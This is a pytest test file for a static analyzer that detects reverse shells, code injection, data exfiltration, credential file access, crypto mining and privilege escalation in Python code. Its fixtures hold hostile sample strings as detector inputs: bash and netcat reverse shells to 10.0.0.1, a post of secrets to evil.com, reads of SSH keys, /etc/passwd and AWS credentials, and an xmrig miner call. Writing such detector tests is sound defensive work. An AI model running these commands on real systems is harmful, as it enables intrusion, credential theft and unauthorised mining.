"""
Tests for the static analyzer module.
"""

import pytest
from app.analyzers.static_analyzer import StaticAnalyzer
from app.models.schemas import Severity, ThreatCategory


@pytest.fixture
def analyzer():
    return StaticAnalyzer()


# ---------------------------------------------------------------------------
# Reverse Shell Detection
# ---------------------------------------------------------------------------

class TestReverseShellDetection:

    def test_socket_import(self, analyzer):
        code = "import socket\ns = socket.socket()"
        findings = analyzer.analyze(code)
        categories = [f.category for f in findings]
        assert ThreatCategory.REVERSE_SHELL in categories

    def test_subprocess_shell_true(self, analyzer):
        code = 'import subprocess\nsubprocess.Popen("ls", shell=True)'
        findings = analyzer.analyze(code)
        assert any(
            f.category == ThreatCategory.REVERSE_SHELL and f.severity == Severity.CRITICAL
            for f in findings
        )

    def test_bash_reverse_shell_string(self, analyzer):
        code = 'cmd = "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.REVERSE_SHELL for f in findings)

    def test_os_system(self, analyzer):
        code = 'import os\nos.system("whoami")'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.REVERSE_SHELL for f in findings)

    def test_nc_command(self, analyzer):
        code = 'cmd = "nc -e /bin/sh 10.0.0.1 4444"'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.REVERSE_SHELL for f in findings)


# ---------------------------------------------------------------------------
# Code Injection Detection
# ---------------------------------------------------------------------------

class TestCodeInjectionDetection:

    def test_eval(self, analyzer):
        code = 'result = eval(user_input)'
        findings = analyzer.analyze(code)
        assert any(
            f.category == ThreatCategory.CODE_INJECTION and f.severity == Severity.CRITICAL
            for f in findings
        )

    def test_exec(self, analyzer):
        code = 'exec("print(1)")'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.CODE_INJECTION for f in findings)

    def test_compile(self, analyzer):
        code = 'c = compile("x=1", "<string>", "exec")'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.CODE_INJECTION for f in findings)

    def test_dunder_import(self, analyzer):
        code = '__import__("os").system("id")'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.CODE_INJECTION for f in findings)


# ---------------------------------------------------------------------------
# Data Exfiltration Detection
# ---------------------------------------------------------------------------

class TestDataExfiltration:

    def test_os_environ(self, analyzer):
        code = 'import os\nkeys = os.environ'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.DATA_EXFILTRATION for f in findings)

    def test_requests_post(self, analyzer):
        code = 'import requests\nrequests.post("http://evil.com", data=secrets)'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.DATA_EXFILTRATION for f in findings)

    def test_sensitive_env_access(self, analyzer):
        code = 'import os\napi_key = os.environ.get("API_KEY")'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.DATA_EXFILTRATION for f in findings)


# ---------------------------------------------------------------------------
# File System Abuse Detection
# ---------------------------------------------------------------------------

class TestFileSystemAbuse:

    def test_ssh_key_access(self, analyzer):
        code = 'f = open("~/.ssh/id_rsa")'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.FILE_SYSTEM_ABUSE for f in findings)

    def test_etc_passwd(self, analyzer):
        code = 'data = open("/etc/passwd").read()'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.FILE_SYSTEM_ABUSE for f in findings)

    def test_aws_credentials(self, analyzer):
        code = 'with open(".aws/credentials") as f: pass'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.FILE_SYSTEM_ABUSE for f in findings)


# ---------------------------------------------------------------------------
# Crypto Mining Detection
# ---------------------------------------------------------------------------

class TestCryptoMining:

    def test_mining_pool(self, analyzer):
        code = 'pool_url = "stratum+tcp://pool.minexmr.com:4444"'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.CRYPTO_MINING for f in findings)

    def test_xmrig(self, analyzer):
        code = 'subprocess.run(["xmrig", "--donate-level", "1"])'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.CRYPTO_MINING for f in findings)


# ---------------------------------------------------------------------------
# Privilege Escalation Detection
# ---------------------------------------------------------------------------

class TestPrivilegeEscalation:

    def test_setuid(self, analyzer):
        code = 'import os\nos.setuid(0)'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.PRIVILEGE_ESCALATION for f in findings)

    def test_ctypes_import(self, analyzer):
        code = 'import ctypes\nctypes.windll.kernel32.something()'
        findings = analyzer.analyze(code)
        assert any(f.category == ThreatCategory.PRIVILEGE_ESCALATION for f in findings)


# ---------------------------------------------------------------------------
# Safe Code (No False Positives)
# ---------------------------------------------------------------------------

class TestSafeCode:

    def test_simple_function(self, analyzer):
        code = '''
def add(a, b):
    """Add two numbers."""
    return a + b

result = add(1, 2)
print(result)
'''
        findings = analyzer.analyze(code)
        # Should have zero findings or only info-level
        critical_or_high = [
            f for f in findings
            if f.severity in (Severity.CRITICAL, Severity.HIGH)
        ]
        assert len(critical_or_high) == 0

    def test_normal_file_read(self, analyzer):
        code = '''
with open("data.txt") as f:
    content = f.read()
print(content)
'''
        findings = analyzer.analyze(code)
        critical_or_high = [
            f for f in findings
            if f.severity in (Severity.CRITICAL, Severity.HIGH)
        ]
        assert len(critical_or_high) == 0

    def test_standard_imports(self, analyzer):
        code = '''
import json
import os.path
from datetime import datetime

data = json.dumps({"key": "value"})
'''
        findings = analyzer.analyze(code)
        critical = [f for f in findings if f.severity == Severity.CRITICAL]
        assert len(critical) == 0
